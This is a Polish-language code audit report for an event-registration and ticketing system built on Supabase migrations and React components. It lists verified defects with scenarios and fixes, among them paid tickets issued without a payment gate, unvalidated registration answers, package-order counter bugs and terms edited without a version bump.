**Naprawa.** Dopisać w obu językach `invalidAccessCode`, `missingRequiredConsents` (z `{{count}}`, tak jak `missingRequiredFields`) i `soldOut`, a `paramsOf` rozszerzyć o `missing_required_consents` w liście kluczy zliczanych z ogona komunikatu. Warto dołożyć bramkę testową sprawdzającą, że każdy `RAISE EXCEPTION` z `event_register` ma odpowiadający klucz.

**Weryfikacja.** registrationFailure buduje klucz `eventRegistration.errors.<camelCase>` i przy braku wpisu wraca do `unknown` (src/lib/events/publicRegistrationErrors.ts:56-67, w szczegolnosci `if (!i18n.exists(candidate)) return { key: ${PREFIX}unknown }` :65). Slownik PL src/lib/i18n-event-registration.ts:104-131 zawiera m.in. missingRequiredFields, termsRequired, ticketNotOnSale, ticketTierRequired - ale `rg -n […]

### [średni] Organizator podejmuje decyzję nie widząc odpowiedzi zgłaszającego - `answers` nigdzie nie renderowane

`src/components/admin/events/organisms/RegistrationsListPanel.tsx:496` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`admin_event_registrations_list` zwraca kolumnę `answers jsonb` (supabase/migrations/20260823150000_event_people_registration.sql:2478) - i to jedyne miejsce, gdzie odpowiedzi na pytania kwalifikujące w ogóle wychodzą z bazy. Żaden komponent panelu ich nie czyta: w `src/components/admin/events/` jedyne trafienie na „answers" to licznik zgłoszeń per pole (RegistrationFieldsPanel.tsx:141). Wiersz listy pokazuje imię, e-mail, stanowisko, firmę, plakietki statusu, biletu i grupy oraz notatkę decyzji (RegistrationsListPanel.tsx:452-490), nie ma szuflady szczegółów ani rozwinięcia. Eksport CSV świadomie odpowiedzi pomija (registrationsCsv.ts:14-18).

**Scenariusz.** Wydarzenie z przebiegiem `approval` i trzema pytaniami kwalifikującymi („sektor", „powód udziału", „reprezentowana instytucja"). Organizator ma 80 zgłoszeń w stanie `pending` i musi je rozstrzygnąć - w panelu nie widzi ani jednej odpowiedzi, więc albo zatwierdza wszystko w ciemno, albo pobiera CSV (gdzie odpowiedzi też nie ma). Cała funkcja „pytania kwalifikujące" jest bezużyteczna poza regułami automatycznymi.

**Naprawa.** Dodać rozwijaną szufladę/`Sheet` szczegółów zgłoszenia w `RegistrationsListPanel`, renderującą `row.answers` zestawione z definicjami pól z `useRegistrationFields(eventId)` (etykieta PL/EN zamiast surowego klucza, wartości `multiselect` jako lista). Osobno rozważyć opcjonalne kolumny odpowiedzi w eksporcie za świadomym przełącznikiem.

**Weryfikacja.** Kolumna wychodzi z bazy: supabase/migrations/20260823150000_event_people_registration.sql:2478 (`answers jsonb` w RETURNS TABLE `admin_event_registrations_list`). W panelu nie ma jej ani jednego odczytu: `rg -n answers src/components/admin/events/` daje wylacznie RegistrationFieldsPanel.tsx:141 (licznik `answers_count`), a `rg -n '\.answers\b' src/components src/routes` trafia tylko na formularz publiczny […]

### [średni] Panel oferuje decyzję „lista rezerwowa" dla zgłoszeń odrzuconych i anulowanych, których RPC nie przepuszcza

`src/lib/events/registrationRows.ts:25` · niespojnosc · weryfikacja: POTWIERDZONE

Tablica `TRANSITIONS` przypisuje stanom `rejected` i `cancelled` akcje `["approve", "waitlist"]` (linie 25-26). Jawna tablica przejść w `admin_event_registration_decide` dopuszcza `waitlist` wyłącznie ze stanów `draft`, `pending`, `approved` (supabase/migrations/20260823150000_event_people_registration.sql:2785). Przyciski są renderowane wprost z tej tablicy (RegistrationsListPanel.tsx:496-509), więc dla każdego odrzuconego i anulowanego wiersza pojawia się przycisk, który zawsze kończy się błędem. Symetrycznie brakuje akcji `reject` dla stanu `approved`, którą RPC dopuszcza (linia 2784) - organizator nie ma jak odwołać zatwierdzenia inaczej niż przez `cancel`.

**Scenariusz.** Organizator otwiera zakładkę „Odrzucone", klika przy wierszu „Lista rezerwowa", wpisuje uzasadnienie i potwierdza. RPC odpowiada `invalid_transition: rejected cannot be waitlist`, panel pokazuje „Zgłoszenie w stanie „rejected" nie może przejść tej operacji." - przycisk jest martwy, a organizator nie ma innej drogi przeniesienia odrzuconego zgłoszenia do kolejki niż zatwierdzić je i od razu przenieść na rezerwę (co […]

**Naprawa.** Zsynchronizować `TRANSITIONS` z tablicą w RPC: `rejected: ["approve"]`, `cancelled: ["approve"]`, `approved: ["attended","no_show","reject","waitlist","cancel"]`. Warto dopisać test jednostkowy porównujący tę tablicę z listą przejść wyciągniętą z migracji (wzorzec `registrationSettingsDraft.test.ts`, który już tak pilnuje CHECK-ów).

**Weryfikacja.** src/lib/events/registrationRows.ts:19-28: `rejected: ['approve','waitlist']`, `cancelled: ['approve','waitlist']`, `approved: ['attended','no_show','waitlist','cancel']`. Sprawdzilem NAJNOWSZA definicje RPC, nie te z 20260823150000: supabase/migrations/20260824090654_943f63be-53b4-4547-b206-3044e6f4c448.sql:134-142 - `(v_action = 'waitlist' AND v_reg.status IN ('draft','pending','approved'))` (:137) oraz `(v_action […]

### [niski] Ręczne dopisanie uczestnika przez organizatora ma RPC, API i hook, ale nie ma interfejsu

`src/lib/events/useEventRegistrations.ts:170` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`admin_event_registration_upsert` powstało wprost po to, żeby wpisać do wydarzenia ludzi, których formularza nikt nie pytał - komentarz w migracji mówi wprost o „21 prelegentach bez konta" (supabase/migrations/20260823150000_event_people_registration.sql:2936-2944). Warstwa kliencka jest kompletna: `saveRegistration` (registrationsApi.ts:443-468) z pełnym mapowaniem pól i `useSaveRegistration` (useEventRegistrations.ts:170-178) z unieważnianiem cache. Żaden komponent tego nie wywołuje - `RegistrationsListPanel` nie ma przycisku „Dodaj uczestnika", a `rg 'useSaveRegistration'` poza definicją trafia wyłącznie na `useSaveRegistrationField`. Ta sama sytuacja dotyczy `markRegistrationsNotified` (registrationsApi.ts:471), którego mutacja po przejściu na wysyłkę serwerową jest wołana już tylko przez `.reset()` (RegistrationsListPanel.tsx:219).

**Scenariusz.** Redakcja przygotowuje kongres z 21 prelegentami bez kont. Aby nadać im grupę „Prelegenci", identyfikator wejścia i pozycję w listach on-site, musi ich mieć w `event_registrations` - a jedyną drogą jest przejście publicznego formularza za każdą z tych osób (z ich adresami e-mail i wymuszoną zgodą na przetwarzanie danych) albo ręczny INSERT w bazie. Panel „Applications" nie ma żadnego przycisku dodania.

**Naprawa.** Dodać w `RegistrationsListPanel` akcję „Dodaj uczestnika" otwierającą dialog (imię, nazwisko, e-mail, stanowisko, firma, bilet, grupa, status, notatka) i podpiąć istniejące `useSaveRegistration`. Przy okazji usunąć nieużywane `useMarkRegistrationsNotified`/`markRegistrationsNotified` albo przywrócić im wywołanie, żeby nie sugerowały drugiej, martwej ścieżki stemplowania.

**Weryfikacja.** `rg -n 'useSaveRegistration|saveRegistration|admin_event_registration_upsert' src/` zwraca wylacznie: definicje API (src/lib/events/registrationsApi.ts:443-444), hook (src/lib/events/useEventRegistrations.ts:170-178), test (src/lib/events/**tests**/registrationsApi.test.ts:225-249) i wygenerowane typy (src/integrations/supabase/types.ts:20225). Zaden komponent tego nie wola - w src/components/admin/events/ nie ma […]

### [niski] Serwer nie waliduje typu ani zbioru opcji odpowiedzi i zapisuje dowolne klucze w `answers`

`supabase/migrations/20260827220945_d4ece1f0-ffc7-43aa-a5b0-a04c95760ae7.sql:377` · ryzyko · weryfikacja: POTWIERDZONE

Jedyna kontrola odpowiedzi po stronie serwera to obecność treści dla pól wymaganych (`_event_answer_matches('not_empty', ...)`, linie 377-387) i logiczna prawda dla zgód (linie 391-403). Nie ma sprawdzenia, czy odpowiedź na pole `number` jest liczbą, czy wartość `select`/`multiselect` należy do `options`, ani czy klucz w ogóle odpowiada polu tego wydarzenia. Cały obiekt jedzie do kolumny wprost (`v_answers, 'self_registration'` w INSERT, linia 528) - jedynym ogranicznikiem jest `jsonb_typeof(answers) = 'object'` (CHECK `event_registrations_answers_object`, 20260823150000:695) i 64 kB na cały payload (linia 235). Klientowa walidacja jest (registrationSubmitDraft.ts:120-131), ale to nie granica bezpieczeństwa. Ma to bezpośredni wpływ na werdykt: `_event_registration_verdict` (20260823150000:1381-1425) porównuje właśnie te niezweryfikowane wartości.

**Scenariusz.** Wydarzenie z regułą kwalifikującą na polu `select` o opcjach ['gov','ngo','biznes'] i wynikiem `auto_approve` dla `in ['gov']`. Zgłaszający woła `event_register` bezpośrednio z `answers: {"sector": "gov", "__note": "<64kB tekstu>", "nieistniejace_pole": [...]}` - dostaje `approved` z pominięciem kolejki akceptacji, a w `answers` ląduje treść, której organizator nigdy nie zadał i której żaden ekran nie umie pokazać. […]

**Naprawa.** W `event_register` przefiltrować `v_answers` przez definicje pól: odrzucić klucze spoza `event_registration_fields` tego wydarzenia (albo zapisywać tylko znane), sprawdzić `jsonb_typeof` względem `field_type` (`number` -> number, `multiselect` -> array, `checkbox`/`switch`/`consent` -> boolean) i dla `select`/`multiselect` zweryfikować przynależność do `options`. Dołożyć górny limit długości pojedynczej odpowiedzi […]

**Weryfikacja.** Opis kodu zgadza sie co do joty: jedyne sprawdzenia to `_event_answer_matches('not_empty', ...)` dla pol wymaganych (20260827220945:376-388) i `is_true` dla zgod (:391-403), oba dodatkowo tylko dla trybu 'form' (:375). Nie ma porownania z `f.options` ani z `f.field_type`, a caly obiekt idzie do kolumny bez filtracji kluczy (`v_answers, 'self_registration'` w INSERT, :526-528). Ograniczniki to faktycznie tylko CHECK […]

---

## Bilety, pakiety, regulaminy

> Warstwa bazy dla E5 jest rozbudowana i przemyslana: `event_ticket_types` (z `group_id`, `price_schedule`, early bird, kodem dostepu, pula), `event_ticket_packages` / `event_package_orders` / `event_package_seats` z trojpoziomowym lancuchem i tokenem zaproszenia w postaci skrotu, `event_terms` + `event_term_acceptances` z wersjonowaniem, oraz zakres wydarzeniowy dolozony do istniejacego silnika kuponow `b2b_coupons`. Panel studia ma trzy ekrany (Bilety, Pakiety, Regulaminy) spiete z RPC `admin_event_ticket_upsert`, `admin_event_package_*`, `admin_event_term_upsert`, a wycene fazowa liczy baza (`_event_ticket_phase`), nie przegladarka. Realny stan jest jednak duzo slabszy niz schemat: platny bilet z Event Buildera nie ma zadnej sciezki zaplaty - publiczny formularz zapisuje uczestnika na bilet za 500 zl jako `approved` bez zamowienia; caly wymiar `audience` / `event_audience_grants` / `event_admission_quote` / `event_package_purchase` jest martwy (zero wywolan z klienta); zakres wydarzeniowy kuponu jest zapisywany, ale nigdy nie egzekwowany przy realizacji; a link zaproszenia na […]

### [KRYTYCZNY] Platny bilet Event Buildera jest wydawany za darmo - zapis publiczny nie ma bramki platnosci

> **To samo ustalenie co „Publiczny event_register() nie sprawdza ceny wejściówki" w sekcji
> „Powiązania między modułami" — dwa podsystemy zobaczyły ten sam defekt. W dokumencie głównym
> występuje raz, jako K-1. Nie liczyć podwójnie.**

`supabase/migrations/20260827220945_d4ece1f0-ffc7-43aa-a5b0-a04c95760ae7.sql:520` · blad · weryfikacja: POTWIERDZONE

`event_register` sprawdza okno sprzedazy, range czlonkostwa, kod dostepu i pule, po czym wstawia zgloszenie ze statusem `approved` - i NIGDY nie patrzy na `t.price_cents` ani na `payment_status`. Grep po `payment|price_cents|paid` w tej migracji trafia wylacznie w bloki listujace cene w `event_registration_form`. Po stronie klienta publiczny formularz pozwala wybrac dowolny bilet, ktorego `availability = 'on_sale'` (src/components/events/registration/RegistrationTicketPicker.tsx:47, src/lib/events/registrationFormSurface.ts:374) i wysyla `ticketTypeId` prosto do `submitRegistration` (src/components/events/registration/PublicRegistrationForm.tsx:122) - bez kasy. Galaz kasowa dla biletow Event Buildera istnieje (src/lib/billing/checkout.functions.ts:135 `isEventTicket && data.ticket_type_id`), ale nikt jej nie osiaga: jedyne miejsce dodajace pozycje do koszyka wysyla `ticketTypeId: null` (src/components/community/EventTicketPurchase.tsx:200), wiec ten przycisk zawsze wpada w stara […]

**Scenariusz.** Organizator tworzy bilet `standard` za 500,00 PLN (price_cents = 50000, is_active, okno otwarte). Uczestnik wchodzi na /events/<slug>/register, zaznacza ten bilet, wysyla formularz. `event_register` zwraca `status: 'approved'`, wystawia token QR i wysyla mail potwierdzajacy. `event_registrations.payment_status` zostaje na domyslnym `not_required`, `payment_order_id` jest NULL. Uczestnik ma wazna wejsciowke, […]

**Naprawa.** W `event_register` odmawiac dla biletu z `_event_ticket_price_now(...) > 0` (np. `payment_required: pay first`) albo tworzyc zgloszenie w statusie `draft` z `payment_status = 'unpaid'` i zwracac identyfikator do kasy; front musi wtedy prowadzic wybor platnego biletu przez `createCheckoutOrder({ kind: 'event_ticket', event_id, ticket_type_id, access_code })`, a `payments_apply_event_ticket_outcome` juz domknie […]

**Weryfikacja.** Przeczytalem cale cialo event_register (supabase/migrations/20260827220945_d4ece1f0-ffc7-43aa-a5b0-a04c95760ae7.sql:230-560). Bilet jest pobierany FOR UPDATE (:337-343) i sprawdzany na okno sprzedazy (:344-350), range (:351-353), kod dostepu (:356-362) - ani razu nie pada price_cents ani payment_status; INSERT do event_registrations (:519-537) nie ustawia payment_order_id/payment_status, wiec zostaje DEFAULT […]

### [wysoki] Anulowanie zamowienia pakietu nie zwalnia puli pakietow i nieodwracalnie kasuje miejsca

`supabase/migrations/20260827221214_14a3d2bb-aa5d-48d3-bb31-34aff2c14dc5.sql:354` · blad · weryfikacja: POTWIERDZONE

`admin_event_package_order_set_status` przy `cancelled` stempluje `revoked_at = now()` i zeruje zaproszenia na wszystkich nieprzypisanych miejscach (linie 386-395), ale nie zmniejsza `event_ticket_packages.sold_count`, ktore `admin_event_package_order_create` podbilo (:342). Nie ma tez zadnej sciezki odwrotnej: powrot statusu na `pending` albo `paid` zmienia tylko wiersz zamowienia, a miejsca zostaja `revoked` - a kazde wyszukanie wolnego miejsca wymaga `revoked_at IS NULL` (:511, 20260824080000...sql:1417, :1560). Sama lista pakietow liczy zamowienia z pominieciem anulowanych (:47), wiec `sold_count` i `orders_count` mowia rozne rzeczy.

**Scenariusz.** Pakiet ma quota = 10. Organizator zaklada zamowienie, po dwoch dniach klient rezygnuje - organizator ustawia status 'Anulowane'. `sold_count` zostaje 1, wiec do sprzedania jest juz tylko 9 pakietow, mimo ze zaden nie zostal sprzedany. Po tygodniu klient wraca, organizator przestawia status z powrotem na 'Oczekujace' - zamowienie ma `seats_total = 5`, `seats_assigned = 0`, ale wszystkie piec wierszy miejsc ma […]

**Naprawa.** W `admin_event_package_order_set_status`: przy przejsciu do `cancelled` (tylko gdy poprzedni status byl inny) wykonac `UPDATE event_ticket_packages SET sold_count = GREATEST(sold_count - 1, 0)`, przy wyjsciu z `cancelled` odwrocic to i wyczyscic `revoked_at` na miejscach, ktore anulowanie samo ustawilo (np. dolozyc `revoked_reason = 'order_cancelled'`, zeby odroznic je od miejsc wycofanych recznie). Alternatywnie […]

**Weryfikacja.** admin_event_package_order_set_status (supabase/migrations/20260827221214_14a3d2bb...sql:354-405) przy 'cancelled' stempluje cancelled_at (:384) i cofa zaproszenia na nieprzypisanych miejscach: revoked_at = now(), invite_email = NULL, invite_token_hash = NULL (:388-396) - nigdzie nie zmniejsza event_ticket_packages.sold_count, ktore admin_event_package_order_create podbilo o 1 (:341-343). Sciezki odwrotnej nie ma: w […]

### [wysoki] Licznik `event_ticket_types.sold_count` rozjezdza sie z rezerwacja miejsc pakietowych

`supabase/migrations/20260824085828_f3fc48a9-6059-4d95-9310-8037127b1d8b.sql:185` · blad · weryfikacja: POTWIERDZONE

`tg_event_registrations_sync_ticket_sold` nie inkrementuje - PRZELICZA: `SET sold_count = c.cnt`, gdzie `c.cnt = count(*)` po `event_registrations` w statusach approved/attended/no_show (linie 203-217). Tymczasem `event_package_purchase` podbija ten sam licznik recznie o liczbe miejsc pakietu (20260824080000...sql:1320: `UPDATE public.event_ticket_types SET sold_count = sold_count + v_pkg.seats`), a `admin_event_package_order_create` - jedyna sciezka zywa w panelu - nie rusza puli typu biletu w ogole (20260827221214...sql:342 podbija tylko `event_ticket_packages.sold_count`). Do tego `event_package_invite_accept` wstawia zatwierdzone zgloszenie z komentarzem "pula biletu nie jest tu dotykana" (20260827221214...sql:698), ale trigger i tak przeliczy licznik po tym INSERT-cie, bez zadnego sprawdzenia `_event_seats_left`.

**Scenariusz.** (a) Pakiet na 5 miejsc kupiony przez `event_package_purchase` podnosi sold_count z 40 na 45 przy quota 50. Ktokolwiek anuluje potem swoj zwykly zapis - trigger przelicza sold_count na 39 i piec oplaconych miejsc pakietowych znika z rezerwacji; sala jest nadsprzedana. (b) Bilet ma quota = 10 i 10 zatwierdzonych zapisow. Zaproszony z pakietu przyjmuje zaproszenie: `event_package_invite_accept` wstawia 11. zgloszenie, […]

**Naprawa.** Jedno zrodlo prawdy o zajetych miejscach: wliczyc miejsca pakietowe do przeliczenia w triggerze (dodac do `c.cnt` liczbe niewycofanych `event_package_seats` bez `registration_id` dla zamowien innych niz `cancelled`), usunac reczne `sold_count = sold_count + seats` z `event_package_purchase`, a `admin_event_package_order_create` uzupelnic o sprawdzenie `_event_seats_left` pod `FOR UPDATE` na wierszu typu biletu. […]

**Weryfikacja.** tg_event_registrations_sync_ticket_sold faktycznie PRZELICZA, a nie inkrementuje: SET sold_count = c.cnt z count(*) po event_registrations w statusach approved/attended/no_show (supabase/migrations/20260824085828_f3fc48a9...sql:209-222), trigger AFTER INSERT OR DELETE OR UPDATE OF status, ticket_type_id, tenant_id FOR EACH ROW (:233-236) - to najnowsza definicja (grep pokazuje tylko 20260823150000 i te). […]

### [wysoki] Lista wartosci `audience` pakietu w kliencie nie odpowiada CHECK-owi bazy - trzy z czterech opcji nie da sie zapisac

`src/lib/events/packagesApi.ts:26` · niespojnosc · weryfikacja: POTWIERDZONE

`export const PACKAGE_AUDIENCES = ["company", "university", "delegation", "partner"]` z komentarzem "odwzorowanie CHECK-a `audience` jeden do jednego". CHECK w bazie brzmi inaczej: `event_ticket_packages_audience_values CHECK (audience IN ('public','member','academic','ngo','company'))` (supabase/migrations/20260824080000_event_admissions_packages_coupons.sql:268). Pokrywa sie wylacznie `company`. Ta sama lista karmi `AdminFormEnumRow` w dialogu (src/components/admin/events/molecules/EventPackageDialog.tsx:126-133) i `packageDraftFromRow` (src/lib/events/packageDraft.ts:94). Odmowa wraca jako 23514, a `adminRegistrationFailure` odrzuca glowe komunikatu Postgresa jako niepasujaca do wzorca klucza (src/lib/events/adminRegistrationErrors.ts:63) i pokazuje `errors.unknown`.

**Scenariusz.** Organizator dodaje pakiet, w polu 'Odbiorca' wybiera 'Uczelnia' (`university`), klika Zapisz. `admin_event_package_upsert` probuje INSERT z audience='university', Postgres rzuca 23514 na `event_ticket_packages_audience_values`, panel pokazuje ogolne 'cos poszlo nie tak' bez wskazania pola. To samo dla `delegation` i `partner`. Dodatkowo pakiet zapisany kiedykolwiek jako 'academic'/'ngo' wraca do formularza […]

**Naprawa.** Zrownac liste z CHECK-iem: `PACKAGE_AUDIENCES = ['public','member','academic','ngo','company']` i dodac tlumaczenia dla nowych kluczy w i18n pakietow; albo - jesli produktowo chodzi o uczelnie/delegacje/partnerow - rozszerzyc CHECK migracja i uzupelnic `event_audience_qualifies` o te grupy. Do czasu decyzji dodac test kontraktowy porownujacy stala z CHECK-iem.

**Weryfikacja.** src/lib/events/packagesApi.ts:25-27 deklaruje ['company','university','delegation','partner'] z komentarzem o odwzorowaniu CHECK-a jeden do jednego. CHECK w bazie: event_ticket_packages_audience_values CHECK (audience IN ('public','member','academic','ngo','company')) - supabase/migrations/20260824080000_event_admissions_packages_coupons.sql:268-269 oraz identycznie 20260825191948_ab7f57aa...sql:180-181; zadna […]

### [wysoki] Regulamin mozna zmienic bez podniesienia wersji, a akceptacja nie utrwala tresci - dowod jest zaprzeczalny

`supabase/migrations/20260824091615_491fb079-e22a-4e48-aee5-694804804b38.sql:398` · ryzyko · weryfikacja: POTWIERDZONE

`admin_event_term_upsert` nadpisuje `body_pl`/`body_en` na kazdym zapisie (`body_pl = COALESCE(p_payload->>'body_pl', tr.body_pl)`), a `version` podnosi WYLACZNIE gdy przyszlo `bump_version = true` (:404). Formularz wysyla `bumpVersion` jako osobny przelacznik domyslnie wylaczony (src/lib/events/termsGroupsDraft.ts:188, :268). Po drugiej stronie `event_term_acceptances` przechowuje `term_id`, `person_id`, `version`, `accepted_at`, `ip_hash`, `user_agent` - i nic wiecej (supabase/migrations/20260824085828_f3fc48a9...sql:105-133). Nie ma ani kopii tresci, ani jej skrotu, ani osobnej tabeli wersji regulaminu. Skutek: `version = 3` wskazuje na tresc, ktora dzisiaj jest w wierszu `event_terms`, a nie na te, ktora uczestnik faktycznie zaakceptowal.

**Scenariusz.** Uczestnik akceptuje regulamin w wersji 2 (klauzula: dane nie sa przekazywane partnerom). Miesiac pozniej organizator edytuje `body_pl`, dopisujac zgode na przekazanie danych partnerom, i nie zaznacza 'podnies wersje'. W bazie nadal stoi `version = 2`, a akceptacja uczestnika nadal wskazuje wersje 2 - czyli formalnie wyglada jak zgoda na NOWA tresc. Przy sporze albo kontroli nie da sie odtworzyc, na co uczestnik […]

**Naprawa.** Dolozyc do `event_term_acceptances` kolumne `body_hash text NOT NULL` (sha256 z `body_pl||body_en||external_url`) i - jesli regulamin ma byc odtwarzalny - `body_snapshot jsonb`, wypelniane w `event_register` (20260827220945...sql:539) i wszedzie, gdzie powstaje akceptacja. Rownolegle: albo wymuszac `bump_version` w `admin_event_term_upsert`, gdy `body_*`/`external_url` sie zmienily i istnieje choc jedna akceptacja, […]

**Weryfikacja.** admin_event_term_upsert nadpisuje tresc na kazdym zapisie: body_pl = COALESCE(p_payload->>'body_pl', tr.body_pl), body_en analogicznie (supabase/migrations/20260824091615_491fb079...sql:397-398), a wersje podnosi wylacznie warunkowo: version = CASE WHEN v_bump THEN tr.version + 1 ELSE tr.version END (:406), gdzie v_bump czyta bump_version z domyslnym false (:375). Formularz trzyma bumpVersion jako osobny przelacznik […]

### [wysoki] Wymiar `audience` / stawki ulgowe / reczne nadania sa martwym kodem - zero UI i zero egzekwowania

`supabase/migrations/20260824080000_event_admissions_packages_coupons.sql:74` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Migracja dolozyla do `event_ticket_types` kolumny `audience`, `requires_verification`, `max_per_person` (:74-77), tabele `event_audience_grants` (:131) z RLS i sladem audytowym, funkcje `event_audience_qualifies` (:712) i `event_admission_quote` (:804) oraz RPC `admin_event_audience_grant_save` / `_revoke` (:1541, :1588). Nic z tego nie ma odpowiednika w kliencie: `EventTicketDialog.tsx` nie ma pola `audience` ani `max_per_person` (grep po tych nazwach w src/components/admin/events/ trafia wylacznie w pakiety), nie ma zadnego ekranu nadan, a jedyna zywa sciezka zapisu - `event_register` (20260827220945...sql) - nie wola `event_audience_qualifies` i nie sprawdza `max_per_person` (grep po `audience|max_per_person` w tej migracji: brak trafien). Ta sama luka dotyczy `event_ticket_packages.requires_verification`, ktore panel ustawia (src/lib/events/packageDraft.ts:195), ale zadna sciezka zakupu nie czyta.

**Scenariusz.** Organizator (przez SQL, bo panelu nie ma) ustawia biletowi `audience = 'academic'`, `requires_verification = true`, `max_per_person = 1`. Uczestnik bez zadnego zwiazku z uczelnia wchodzi na publiczny formularz, wybiera bilet akademicki i dostaje go - `event_register` nie zna tych kolumn. Ten sam uczestnik moze tez wziac dowolna liczbe takich biletow na rozne adresy poczty, bo `max_per_person` egzekwuje wylacznie […]

**Naprawa.** Krotkoterminowo: przeniesc sprawdzenia z `event_admission_quote` (:920-980: `event_audience_qualifies` przy `requires_verification` oraz limit `max_per_person` liczony przez `event_people.user_id`) do `event_register`, zeby kolumny przestaly klamac. Docelowo: dolozyc pola `audience` / `requires_verification` / `max_per_person` do EventTicketDialog i ekran nadan uprawnien (`event_audience_grants`) jako nowa sekcje […]

**Weryfikacja.** Kolumny event_ticket_types.audience / requires_verification / max_per_person istnieja (supabase/migrations/20260824080000_event_admissions_packages_coupons.sql:73-105), tabela event_audience_grants z RLS (:133-217), event_audience_qualifies (:712-779) i event_admission_quote (:804-1005), plus RPC nadan w 20260825191948_ab7f57aa...sql:1224-1295. Po stronie klienta grep 'audience|max_per_person|requires_verification' […]

### [wysoki] Zaproszenie na miejsce z pakietu prowadzi na nieistniejaca trase - zaproszony nie ma jak sie zapisac

`src/lib/events/packagesApi.ts:222` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`packageInviteUrl(origin, token)` sklada adres `${origin}/events/invite/${token}` i to jedyny artefakt, ktory dostaje organizator (src/components/admin/events/molecules/EventPackageSeatsDialog.tsx:96-97, link wyswietlany do recznego skopiowania). W src/routes/ nie ma pliku obslugujacego `/events/invite/...` - sa wylacznie events.$slug.*, events.$slug_.register, events.$slug_.manage, events.index, events.saved. Rownolegle RPC `event_package_invite_accept` (supabase/migrations/20260827221214_14a3d2bb...sql:561), nadane `anon, authenticated`, kompletnie sprawne (rate limit, jednorazowy token, dziedziczenie grupy z typu biletu), nie jest wolane z zadnego miejsca w src/.

**Scenariusz.** Firma kupuje pakiet 5 miejsc. Organizator w oknie 'Miejsca' wystawia zaproszenie na adres pracownika, kopiuje wyswietlony link i wysyla go mailem (wysylki tez nie ma - token wraca tylko na ekran). Pracownik klika i dostaje 404. Miejsce zostaje na zawsze w stanie 'invited' - nie da sie go ani przyjac, ani ponownie wystawic na ten sam adres, bo `event_package_seats_invite_uniq` blokuje powtorke tego adresu na tym […]

**Naprawa.** Dodac trase publiczna `src/routes/events_.invite.$token.tsx` (osobny segment, zeby nie kolidowala z `events.$slug`), ktora renderuje krotki formularz (imie, nazwisko, stanowisko, zgoda) i wola `event_package_invite_accept`. Przy okazji spiac wysylke maila z zaproszeniem po wzorcu `registrationNotify.server.ts`, bo dzisiaj token istnieje wylacznie na ekranie organizatora.

**Weryfikacja.** packageInviteUrl sklada `${origin}/events/invite/${token}` (src/lib/events/packagesApi.ts:221-224) i jest uzyte tylko do wyswietlenia linku do recznego skopiowania (src/components/admin/events/molecules/EventPackageSeatsDialog.tsx:94-99, copyLink :105-110). W src/routes/ nie ma pliku obslugujacego ten adres - `ls src/routes | grep -i events` daje wylacznie events.$slug.*, events.$slug_.register, […]

### [średni] Brak wyboru grupy w dialogu biletu - kryterium odbioru E5 'typ biletu nadaje grupe' nieosiagalne z panelu

`src/components/admin/events/molecules/EventTicketDialog.tsx:8` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Cala mechanika po stronie bazy istnieje i dziala: kolumna `event_ticket_types.group_id` z kluczem obcym po trojce (20260824085456_8697b58a...sql:265), obsluga w `admin_event_ticket_upsert` (20260828051054...sql:248, :283 oraz walidacja przynaleznosci grupy do wydarzenia w :135), zwrot `group_id`/`group_name_*` w `admin_event_tickets_list` (:332) i wreszcie nadanie grupy przy zapisie: `v_group_id := v_ticket.group_id` (20260827220945...sql:362). Brakuje wylacznie kontrolki. Komentarz w naglowku dialogu tlumaczy to tak: "GRUPY NIE WYBIERAMY TUTAJ. Katalog grup wydarzenia ma wlasny ekran; do czasu jego powstania..." - a ekran juz istnieje (src/components/admin/events/organisms/EventGroupsPanel.tsx, trasa src/routes/admin.events_.$eventId.groups.tsx). Grep po `groupId` w src/components/admin/events/ nie daje ani jednego trafienia w dialogu biletu, a `EventTicketsPanel` nie pokazuje nawet nazwy grupy, mimo ze RPC ja zwraca.

**Scenariusz.** Organizator tworzy grupy 'Prasa' i 'VIP' oraz odpowiadajace im typy biletow. Chce, zeby bilet prasowy automatycznie wrzucal uczestnika do grupy 'Prasa' (od tego zaleza uprawnienia spotkan, widocznosc listy uczestnikow i dostep do nagran). W dialogu biletu nie ma takiego pola, wiec `group_id` zostaje NULL, a `event_register` przypisuje wszystkim grupe domyslna. Jedyne obejscie to reczne dopisywanie kazdego uczestnika […]

**Naprawa.** Dodac do `EventTicketDialog` `FormSelect` z grupami wydarzenia (zrodlo: hook grup uzywany przez EventGroupsPanel, tak jak `EventPackageDialog` pobiera bilety) sterujacy `draft.groupId`, z opcja pusta = 'grupa domyslna'. Sciezka danych juz jest kompletna: `ticketDraft.groupId` -> `ticketDraftToInput` (ticketDraft.ts:370) -> `group_id` w payloadzie (registrationsApi.ts:213). Warto tez pokazac nazwe grupy w wierszu […]

**Weryfikacja.** Komentarz w naglowku dialogu wprost mowi 'GRUPY NIE WYBIERAMY TUTAJ (...) do czasu jego powstania' (src/components/admin/events/molecules/EventTicketDialog.tsx:8-10), a grep 'group' po tym pliku nie daje ANI JEDNEGO trafienia poza tym komentarzem. Mechanika bazy dziala: kolumna group_id z trojkowym kluczem obcym (supabase/migrations/20260824085456_8697b58a...sql:265-267), walidacja przynaleznosci grupy do wydarzenia […]

### [średni] Status 'refunded' zamowienia pakietu wyswietla sie jako 'pending' i mozna go tym selectem cicho nadpisac

`src/components/admin/events/organisms/EventPackagesPanel.tsx:57` · blad · weryfikacja: POTWIERDZONE

`function orderStatus(value: string): PackageOrderStatus { return value === 'paid' || value === 'cancelled' ? value : 'pending'; }` - kazda inna wartosc, w tym `refunded`, degraduje sie do `pending`. Funkcja jest uzyta w dwie strony: jako `value` selecta (:303) i jako wartosc wyslana do mutacji (:311). Zrodlo dopuszcza cztery stany - CHECK `event_package_orders_status_values` to `('pending','paid','cancelled','refunded')` (20260824080000...sql:378), a `admin_event_package_order_set_status` przyjmuje wszystkie cztery (20260827221214...sql:365). Zwezona jest tylko stala klienta: `PACKAGE_ORDER_STATUSES = ['pending','paid','cancelled']` (src/lib/events/packagesApi.ts:30, z komentarzem sugerujacym kompletnosc odwzorowania CHECK-a).

**Scenariusz.** Zamowienie pakietu zostaje zwrocone (status `refunded`, `paid_at` zachowane). Na liscie pakietow organizator widzi przy nim 'Oczekujace' - informacje wprost sprzeczna z ksiegowoscia. Jesli w tym momencie kliknie w select i wybierze cokolwiek, wysle `status: 'pending'`, co wyzeruje `paid_at` (RPC: `paid_at = CASE WHEN v_status IN ('paid','refunded') THEN ... END`) i skasuje slad zwrotu.

